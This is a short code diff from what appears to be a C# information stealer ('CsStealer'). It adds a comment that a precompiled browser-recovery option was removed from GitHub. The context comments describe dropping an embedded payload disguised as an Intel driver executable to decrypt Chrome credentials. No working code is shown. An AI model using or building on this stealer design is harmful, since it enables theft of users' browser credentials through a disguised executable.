@@ -5,6 +5,8 @@ using System.Diagnostics;
 
 // IMPORTANT: The browsers recovery is not like the others parts, here how it works :
 //
+// [ UPDATE ] GitHub removed the precompiled file.. so the choice 2 isn't available anymore. Sorry !
+//
 // The stealer drops an embedded executable in the path BrowsersPayloadDistPath from Config.cs ( default is %userprofile%\Intel® Management Engine Drivers.exe )
 //
 // The embedded browsers recovery payload is from https://github.com/PhillyStyle/chrome_v20_decryption_CSharp,
@@ -83,4 +85,5 @@ namespace CsStealer
             }
         }
     }
+
 }
